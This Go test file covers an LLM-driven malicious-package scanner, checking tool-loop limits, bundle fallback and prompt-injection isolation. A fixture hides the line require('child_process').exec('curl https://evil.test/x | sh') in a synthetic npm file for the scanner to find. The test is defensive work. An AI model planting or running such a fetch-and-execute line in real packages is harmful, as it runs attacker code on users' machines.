package llmpkgscan

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/scan/commit"
)

// largePackage is too big for the first prompt, so the model has to go looking.
// The payload sits in an unremarkably named file deep in lib/, behind the
// entry point — not among the files the seed leads with.
func largePackage(payloadMarker string) []byte {
	files := map[string]string{
		"index.js":  "module.exports = require('./lib/loader');\n",
		"README.md": "# big-pkg\n" + strings.Repeat("Documentation paragraph. ", 2000) + "\n",
	}
	for i := 0; i < 40; i++ {
		files[fmt.Sprintf("lib/mod%02d.js", i)] = fmt.Sprintf("// module %d\n", i) + strings.Repeat("exports.value = 1; // filler line\n", 300)
	}
	files["lib/loader.js"] = strings.Repeat("// loader boilerplate\n", 400) +
		"require('child_process').exec('curl https://evil.test/x | sh'); // " + payloadMarker + "\n"
	return pkgscantest.NpmTarball("big-pkg", "2.0.0", nil, files)
}

// smallLimits makes the seed prompt small enough that largePackage overflows it.
func smallLimits(c *Config) {
	c.Limits.MaxPromptBytes = 16 << 10
}

// investigator is a mock model that uses tools the way a reviewer would: search
// for process execution, read the file that matches, then answer.
func investigator() *pkgscantest.Provider {
	return &pkgscantest.Provider{Plan: func(turn int, material string) []commit.ToolCall {
		switch turn {
		case 1:
			return []commit.ToolCall{pkgscantest.Call("c1", toolGrep, map[string]any{"pattern": `child_process`})}
		case 2:
			path, line, _ := pkgscantest.Locate(material, "require('child_process')")
			if path == "" {
				return nil
			}
			start := line - 2
			if start < 1 {
				start = 1
			}
			return []commit.ToolCall{pkgscantest.Call("c2", toolReadFile, map[string]any{"path": path, "start_line": start, "max_lines": 5})}
		}
		return nil
	}}
}

func TestToolLoopFindsWhatTheSeedDidNotShow(t *testing.T) {
	p := investigator()
	svc := newService(t, p, smallLimits)
	artifact := largePackage(pkgscantest.MaliciousMarker)
	rep := assess(t, svc, request(artifact, "big-pkg", "2.0.0", nil))

	if rep.Disposition != DispositionMalicious {
		t.Fatalf("disposition = %q (unscanned %+v): the payload behind the entry point was not found", rep.Disposition, rep.Unscanned)
	}
	v := rep.Verdict
	if v.Mode != modeTools || v.Turns != 3 || v.ToolCalls != 2 {
		t.Errorf("mode=%s turns=%d toolCalls=%d, want tools/3/2", v.Mode, v.Turns, v.ToolCalls)
	}
	if len(v.Evidence) != 1 || v.Evidence[0].Path != "package/lib/loader.js" || v.Evidence[0].Line != 401 || !v.Evidence[0].Verified {
		t.Errorf("evidence = %+v, want package/lib/loader.js:401 verified", v.Evidence)
	}
	// In tool mode the model could reach every file, so an over-full seed is not
	// a truncated view.
	if v.Truncated {
		t.Errorf("tool-mode verdict marked truncated: %v", v.Coverage)
	}

	reqs := p.ToolRequests()
	if len(reqs) != 3 {
		t.Fatalf("tool requests = %d, want 3", len(reqs))
	}
	// The seed did not contain the payload: the tools found it.
	if strings.Contains(reqs[0].Messages[0].Text, pkgscantest.MaliciousMarker) {
		t.Fatal("the payload was already in the seed; this test would prove nothing")
	}
	if !strings.Contains(reqs[0].Messages[0].Text, "are not shown above") {
		t.Error("the seed does not say that files were left out")
	}
	// Exactly the three read-only tools are declared, on every turn.
	for i, r := range reqs {
		var names []string
		for _, tool := range r.Tools {
			names = append(names, tool.Name)
		}
		if strings.Join(names, ",") != "list_files,read_file,grep" {
			t.Errorf("turn %d declares tools %v", i+1, names)
		}
		if r.Model != "mock-model" || r.System != systemPrompt(true) {
			t.Errorf("turn %d: wrong model or system prompt", i+1)
		}
	}
	// Tool results come back framed as package data under the scan's nonce.
	nonce := nonceOf(t, reqs[0].Messages[0].Text)
	results := reqs[2].Messages[len(reqs[2].Messages)-1].ToolResults
	if len(results) != 1 || results[0].CallID != "c2" || !strings.HasPrefix(results[0].Content, openMarker(nonce)) {
		t.Errorf("tool result = %+v", results)
	}

	snap := svc.Metrics()
	if snap.ToolCallsByTool[toolGrep] != 1 || snap.ToolCallsByTool[toolReadFile] != 1 || snap.Turns != 3 || snap.ProviderCalls != 3 {
		t.Errorf("metrics: tools %v turns %d calls %d", snap.ToolCallsByTool, snap.Turns, snap.ProviderCalls)
	}
}

func TestSmallPackageIsSettledInOnePlainCompletion(t *testing.T) {
	// When the seed shows the whole package, tools have nothing to add: the scan
	// is a single ordinary completion even with a tool-capable provider.
	p := investigator()
	svc := newService(t, p, nil)
	rep := assess(t, svc, request(maliciousPackage(), "evil-pad", "1.0.0", nil))
	if rep.Disposition != DispositionMalicious {
		t.Fatalf("disposition = %q", rep.Disposition)
	}
	if p.ToolTurns() != 0 || p.Calls() != 1 || rep.Verdict.Mode != modeBundle || rep.Verdict.Turns != 1 {
		t.Errorf("toolTurns=%d calls=%d mode=%s turns=%d, want one plain completion", p.ToolTurns(), p.Calls(), rep.Verdict.Mode, rep.Verdict.Turns)
	}
	if got := p.Requests()[0].System; got != systemPrompt(false) {
		t.Error("the single-shot path must use the no-tools system prompt")
	}
}

func TestToolLoopIsBoundedInTurnsAndCalls(t *testing.T) {
	// A model that never stops asking for tools.
	greedy := func() *pkgscantest.Provider {
		n := 0
		return &pkgscantest.Provider{Plan: func(turn int, material string) []commit.ToolCall {
			n++
			return []commit.ToolCall{pkgscantest.Call(fmt.Sprintf("c%d", n), toolListFiles, map[string]any{"offset": n})}
		}}
	}

	t.Run("turn cap forces an answer", func(t *testing.T) {
		p := greedy()
		svc := newService(t, p, func(c *Config) {
			smallLimits(c)
			c.Limits.MaxTurns = 4
		})
		rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
		// The mock honors NoTools (it answers when tools are forbidden), so the
		// final turn yields a verdict.
		if !rep.Scanned() || rep.Verdict.Turns != 4 || rep.Verdict.ToolCalls != 3 {
			t.Fatalf("scanned=%v turns/toolCalls=%+v unscanned=%+v", rep.Scanned(), rep.Verdict, rep.Unscanned)
		}
		reqs := p.ToolRequests()
		for i, r := range reqs {
			wantNoTools := i == len(reqs)-1
			if r.NoTools != wantNoTools {
				t.Errorf("turn %d: NoTools = %v, want %v", i+1, r.NoTools, wantNoTools)
			}
		}
		last := reqs[len(reqs)-1].Messages
		if !strings.Contains(last[len(last)-1].Text, "tool allowance for this review is spent") {
			t.Error("the final turn does not tell the model its allowance is spent")
		}
	})

	t.Run("call cap forces an answer", func(t *testing.T) {
		p := greedy()
		svc := newService(t, p, func(c *Config) {
			smallLimits(c)
			c.Limits.MaxToolCalls = 2
			c.Limits.MaxTurns = 20
		})
		rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
		if !rep.Scanned() || rep.Verdict.ToolCalls != 2 || rep.Verdict.Turns != 3 {
			t.Fatalf("verdict = %+v unscanned = %+v", rep.Verdict, rep.Unscanned)
		}
	})

	t.Run("a model that ignores the cap gets no verdict", func(t *testing.T) {
		// It keeps calling tools even when told it may not.
		stubborn := &stubbornProvider{}
		svc := newService(t, stubborn, func(c *Config) {
			smallLimits(c)
			c.Limits.MaxTurns = 3
		})
		rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
		if rep.Unscanned == nil || rep.Unscanned.Code != CodeMalformedOutput {
			t.Fatalf("unscanned = %+v, want %s", rep.Unscanned, CodeMalformedOutput)
		}
		if stubborn.calls != 3 {
			t.Errorf("provider calls = %d, want exactly the 3 allowed turns", stubborn.calls)
		}
	})

	t.Run("several calls in one turn are all answered", func(t *testing.T) {
		p := &pkgscantest.Provider{Plan: func(turn int, material string) []commit.ToolCall {
			if turn > 1 {
				return nil
			}
			return []commit.ToolCall{
				pkgscantest.Call("a", toolListFiles, nil),
				pkgscantest.Call("b", "format_disk", nil),
				pkgscantest.Call("c", toolGrep, map[string]any{"pattern": "exec"}),
			}
		}}
		svc := newService(t, p, smallLimits)
		rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
		if !rep.Scanned() {
			t.Fatalf("unscanned = %+v", rep.Unscanned)
		}
		reqs := p.ToolRequests()
		results := reqs[1].Messages[len(reqs[1].Messages)-1].ToolResults
		if len(results) != 3 || results[0].CallID != "a" || results[1].CallID != "b" || results[2].CallID != "c" {
			t.Fatalf("results = %+v, want one per call, in order", results)
		}
		if results[0].IsError || !results[1].IsError || results[2].IsError {
			t.Errorf("only the unknown tool should have failed: %v %v %v", results[0].IsError, results[1].IsError, results[2].IsError)
		}
		// The unknown tool is not counted as an executed call.
		if rep.Verdict.ToolCalls != 2 {
			t.Errorf("tool calls = %d, want 2", rep.Verdict.ToolCalls)
		}
	})
}

// stubbornProvider always asks for a tool, even when forbidden to.
type stubbornProvider struct{ calls int }

func (s *stubbornProvider) Name() string { return "stubborn" }
func (s *stubbornProvider) Complete(context.Context, commit.Request) (string, commit.Usage, error) {
	return pkgscantest.BenignVerdict, commit.Usage{}, nil
}
func (s *stubbornProvider) CompleteTools(_ context.Context, req commit.ToolRequest) (commit.ToolResponse, commit.Usage, error) {
	s.calls++
	return commit.ToolResponse{
		ToolCalls: []commit.ToolCall{pkgscantest.Call(fmt.Sprintf("c%d", s.calls), toolListFiles, nil)},
		Stop:      commit.ToolStopToolUse,
	}, commit.Usage{InputTokens: 10, OutputTokens: 5}, nil
}

func TestTokenCapStopsTheLoop(t *testing.T) {
	// Each turn reports 40k tokens; the cap is 100k.
	p := investigator()
	p.Usage = commit.Usage{InputTokens: 39000, OutputTokens: 1000}
	n := 0
	p.Plan = func(turn int, material string) []commit.ToolCall {
		n++
		return []commit.ToolCall{pkgscantest.Call(fmt.Sprintf("c%d", n), toolListFiles, map[string]any{"offset": n})}
	}
	svc := newService(t, p, func(c *Config) {
		smallLimits(c)
		c.Limits.MaxTotalTokens = 100000
		c.Limits.MaxOutputTokens = 1000
		c.Limits.MaxTurns = 30
	})
	rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
	if !rep.Scanned() {
		t.Fatalf("unscanned = %+v: the token cap should force an answer, not lose the scan", rep.Unscanned)
	}
	if rep.Verdict.Turns > 3 {
		t.Errorf("turns = %d: the loop ran past the token cap", rep.Verdict.Turns)
	}
	total := rep.Verdict.InputTokens + rep.Verdict.OutputTokens
	if total > 100000+40000 {
		t.Errorf("the scan used %d tokens, more than one turn past the 100000 cap", total)
	}
}

func TestTruncatedReplyIsNotAVerdict(t *testing.T) {
	cut := &cutOffProvider{}
	svc := newService(t, cut, smallLimits)
	rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
	if rep.Unscanned == nil || rep.Unscanned.Code != CodeMalformedOutput || !strings.Contains(rep.Unscanned.Detail, "cut off") {
		t.Fatalf("unscanned = %+v, want a cut-off reply treated as malformed", rep.Unscanned)
	}
}

// cutOffProvider returns a reply truncated at the output-token limit that
// happens to parse as a complete benign verdict.
type cutOffProvider struct{}

func (cutOffProvider) Name() string { return "cutoff" }
func (cutOffProvider) Complete(context.Context, commit.Request) (string, commit.Usage, error) {
	return pkgscantest.BenignVerdict, commit.Usage{}, nil
}
func (cutOffProvider) CompleteTools(context.Context, commit.ToolRequest) (commit.ToolResponse, commit.Usage, error) {
	return commit.ToolResponse{Text: pkgscantest.BenignVerdict, Stop: commit.ToolStopMaxTokens}, commit.Usage{}, nil
}

func TestBundleModeForAProviderWithoutTools(t *testing.T) {
	p := &pkgscantest.Provider{}
	artifact := largePackage(pkgscantest.MaliciousMarker)

	svc := newService(t, p.BundleOnly(), smallLimits)
	if svc.UsesTools() {
		t.Fatal("a provider without tool use must not be given the tool loop")
	}
	rep := assess(t, svc, request(artifact, "big-pkg", "2.0.0", nil))
	if !rep.Scanned() {
		t.Fatalf("unscanned = %+v", rep.Unscanned)
	}
	if p.ToolTurns() != 0 || p.Calls() != 1 || rep.Verdict.Mode != modeBundle {
		t.Errorf("toolTurns=%d calls=%d mode=%s, want one single-shot completion", p.ToolTurns(), p.Calls(), rep.Verdict.Mode)
	}

	req := p.Requests()[0]
	if req.System != systemPrompt(false) || !strings.Contains(req.System, "You have no tools") {
		t.Error("bundle mode must use the no-tools system prompt")
	}
	prompt := req.User
	// The bundle is bounded.
	if len(prompt) > (16<<10)+(8<<10) {
		t.Errorf("prompt is %d bytes, far over the 16 KiB budget", len(prompt))
	}
	// Priority: the manifest and the entry point lead; bulk docs do not crowd
	// them out.
	manifest := strings.Index(prompt, "--- FILE: package/package.json")
	entry := strings.Index(prompt, "--- FILE: package/index.js")
	if manifest < 0 || entry < 0 {
		t.Fatalf("the manifest and entry point must be in the bundle (manifest %d, entry %d)", manifest, entry)
	}
	if readme := strings.Index(prompt, "--- FILE: package/README.md"); readme >= 0 && readme < entry {
		t.Error("documentation was placed ahead of the entry point")
	}
	// Truncation is stated explicitly, in both places it matters.
	if !strings.Contains(prompt, "== NOT SHOWN ==") || !strings.Contains(prompt, "did not fit and CANNOT be requested") {
		t.Error("the bundle does not name what it left out")
	}
	if !strings.Contains(prompt, "You have no tools and will receive nothing further") {
		t.Error("the bundle does not tell the model it cannot ask for more")
	}
	if !rep.Verdict.Truncated || len(rep.Verdict.Coverage) == 0 {
		t.Errorf("a verdict on a partial bundle must be marked truncated: %+v", rep.Verdict.Coverage)
	}

	// mode=bundle forces the same path on a tool-capable provider.
	p2 := investigator()
	forced := newService(t, p2, func(c *Config) { smallLimits(c); c.Mode = ModeBundle })
	if forced.UsesTools() {
		t.Error("mode=bundle must disable the tool loop")
	}
	assess(t, forced, request(artifact, "big-pkg", "2.0.0", nil))
	if p2.ToolTurns() != 0 {
		t.Errorf("mode=bundle used %d tool turns", p2.ToolTurns())
	}

	// mode=tools with a provider that has none is a configuration error.
	if _, err := NewService(Config{Enabled: true, Provider: p.BundleOnly(), Model: "m", Mode: ModeTools, Logger: discard()}); err == nil {
		t.Error("mode=tools must be rejected for a provider without tool use")
	}
}

func TestSeedStatesAnIncompleteUnpack(t *testing.T) {
	files := map[string]string{}
	for i := 0; i < 50; i++ {
		files[fmt.Sprintf("pkg/f%02d.js", i)] = "x\n"
	}
	tree := mustTree(t, pkgscantest.TarGz(files), Limits{MaxFiles: 20})
	sd := buildSeed(tree, Artifact{Ecosystem: "npm", Name: "p", Version: "1"}, DefaultLimits(), testNonce, false)
	if !strings.Contains(sd.text, "- view: INCOMPLETE") || !strings.Contains(sd.text, "Members beyond that limit were NOT unpacked") {
		t.Errorf("the seed does not state that the unpack was incomplete:\n%.600s", sd.text)
	}
	// The note is the proxy's own statement: it sits before the data block.
	if strings.Index(sd.text, "INCOMPLETE") > strings.Index(sd.text, openMarker(testNonce)) {
		t.Error("the truncation statement must be in the trusted preamble")
	}

	whole := mustTree(t, benignPackage(), Limits{})
	sd = buildSeed(whole, Artifact{Ecosystem: "npm", Name: "left-pad", Version: "1.3.0"}, DefaultLimits(), testNonce, false)
	if !strings.Contains(sd.text, "- view: COMPLETE") || !sd.complete || sd.omitted != 0 {
		t.Errorf("a small package's seed: complete=%v omitted=%d", sd.complete, sd.omitted)
	}
}

func TestSeedKeepsPackageStringsOutOfTheTrustedParts(t *testing.T) {
	// Every string the publisher controls — name, version, file name, paths,
	// link targets, anomalies — must land inside the data block.
	hostile := "INJECT-" + strings.Repeat("A", 8)
	artifact := tarGzMembers(t, []tarMember{
		{name: "pkg/" + hostile + "-path.js", data: "x\n"},
		{name: "../" + hostile + "-traversal", data: "y\n"},
		{name: "pkg/link", typeflag: '2', linkname: "/" + hostile + "-target"},
	})
	tree := mustTree(t, artifact, Limits{})
	art := Artifact{Ecosystem: "npm", Name: hostile + "-name", Version: hostile + "-version", Filename: hostile + "-file.tgz"}
	for _, tools := range []bool{true, false} {
		sd := buildSeed(tree, art, DefaultLimits(), testNonce, tools)
		start := strings.Index(sd.text, openMarker(testNonce))
		end := strings.Index(sd.text, closeMarker(testNonce))
		if start < 0 || end < start {
			t.Fatal("markers missing")
		}
		outside := sd.text[:start] + sd.text[end+len(closeMarker(testNonce)):]
		if strings.Contains(outside, hostile) {
			t.Errorf("tools=%v: a publisher-controlled string appears outside the data block:\n%s", tools, outside)
		}
		inside := sd.text[start:end]
		for _, want := range []string{"-name", "-version", "-file.tgz", "-path.js", "-traversal", "-target"} {
			if !strings.Contains(inside, hostile+want) {
				t.Errorf("tools=%v: %q is missing from the data block", tools, hostile+want)
			}
		}
	}
}

// noToolsGateway is a provider whose endpoint has no function calling: a plain
// completion works, a tool-bearing request is answered with an HTTP error.
type noToolsGateway struct {
	*pkgscantest.Provider
	status       int
	toolRequests int
}

func (g *noToolsGateway) CompleteTools(context.Context, commit.ToolRequest) (commit.ToolResponse, commit.Usage, error) {
	g.toolRequests++
	return commit.ToolResponse{}, commit.Usage{}, commit.NewStatusError(g.status, errors.New("tools are not supported by this model"))
}

// "auto" promises the single-shot bundle for a provider without tool use. For a
// hosted gateway that can only be discovered by asking, so the first rejection
// of a tool-bearing request falls back to the bundle and pauses the tool loop.
func TestAutoModeFallsBackToTheBundleWhenTheEndpointRejectsTools(t *testing.T) {
	now := time.Unix(1_800_000_000, 0)
	gw := &noToolsGateway{Provider: &pkgscantest.Provider{}, status: 400}
	svc := newService(t, gw, func(c *Config) {
		smallLimits(c)
		c.Now = func() time.Time { return now }
	})
	if !svc.UsesTools() {
		t.Fatal("a tool-capable provider should start with tools on")
	}

	rep := assess(t, svc, request(largePackage("no marker here"), "big-pkg", "2.0.0", nil))
	if !rep.Scanned() || rep.Verdict.Mode != modeBundle {
		t.Fatalf("report = %+v (unscanned %+v), want a bundle-mode verdict", rep.Verdict, rep.Unscanned)
	}
	if gw.toolRequests != 1 || gw.Calls() != 1 {
		t.Errorf("tool requests = %d, plain completions = %d; want one of each", gw.toolRequests, gw.Calls())
	}
	// The verdict is honest about what a bundle of a large package covers.
	if !rep.Verdict.Truncated {
		t.Error("a bundle that did not hold the whole package must be marked truncated")
	}
	if svc.UsesTools() || svc.Status().ToolUse {
		t.Error("tools should be paused after the endpoint rejected them")
	}

	// The next scan does not ask for tools again...
	other := pkgscantest.NpmTarball("big-two", "1.0.0", nil, map[string]string{"a.js": strings.Repeat("exports.a = 1; // filler\n", 2000)})
	assess(t, svc, request(other, "big-two", "1.0.0", nil))
	if gw.toolRequests != 1 {
		t.Errorf("tool requests = %d: the paused tool loop was tried again", gw.toolRequests)
	}
	// ...until the pause has run out.
	now = now.Add(toolsSuspension + time.Minute)
	third := pkgscantest.NpmTarball("big-three", "1.0.0", nil, map[string]string{"a.js": strings.Repeat("exports.b = 2; // filler\n", 2000)})
	assess(t, svc, request(third, "big-three", "1.0.0", nil))
	if gw.toolRequests != 2 {
		t.Errorf("tool requests = %d: tools were not retried after the pause", gw.toolRequests)
	}
}

func TestToolRejectionFallbackIsNarrow(t *testing.T) {
	for name, tc := range map[string]struct {
		mode   Mode
		status int
	}{
		"explicit tools mode never falls back": {ModeTools, 400},
		"bad credentials are not 'no tools'":   {ModeAuto, 401},
		"forbidden is not 'no tools'":          {ModeAuto, 403},
	} {
		gw := &noToolsGateway{Provider: &pkgscantest.Provider{}, status: tc.status}
		svc := newService(t, gw, func(c *Config) {
			smallLimits(c)
			c.Mode = tc.mode
		})
		rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
		if rep.Unscanned == nil || rep.Unscanned.Code != CodeProviderError {
			t.Errorf("%s: report = %+v, want %s", name, rep.Verdict, CodeProviderError)
		}
		if gw.Calls() != 0 {
			t.Errorf("%s: fell back to a plain completion", name)
		}
		if !svc.UsesTools() {
			t.Errorf("%s: tools were paused", name)
		}
	}

	// A rate limit or an outage is transient, not a statement about tools.
	for _, status := range []int{429, 503} {
		if toolRequestRejected(commit.NewStatusError(status, errors.New("x"))) {
			t.Errorf("status %d treated as a rejection of tools", status)
		}
	}
	if toolRequestRejected(errors.New("connection reset")) || toolRequestRejected(nil) {
		t.Error("an error without an HTTP status treated as a rejection of tools")
	}
	// The status survives the wrapping the scan applies.
	wrapped := classifyProviderError(context.Background(), fmt.Errorf("attempt 1: %w", commit.NewStatusError(422, errors.New("unknown field tools"))))
	if !toolRequestRejected(wrapped) {
		t.Error("the HTTP status was lost in error classification")
	}
}

// A fallback that does not itself succeed proves nothing about tools.
func TestFailedFallbackDoesNotPauseTools(t *testing.T) {
	gw := &noToolsGateway{Provider: &pkgscantest.Provider{Judge: func(string) string { return "not json" }}, status: 400}
	svc := newService(t, gw, smallLimits)
	rep := assess(t, svc, request(largePackage("x"), "big-pkg", "2.0.0", nil))
	if rep.Unscanned == nil || rep.Unscanned.Code != CodeMalformedOutput {
		t.Fatalf("report = %+v / %+v, want %s", rep.Verdict, rep.Unscanned, CodeMalformedOutput)
	}
	if !svc.UsesTools() {
		t.Error("tools were paused although the fallback did not produce a verdict")
	}
}
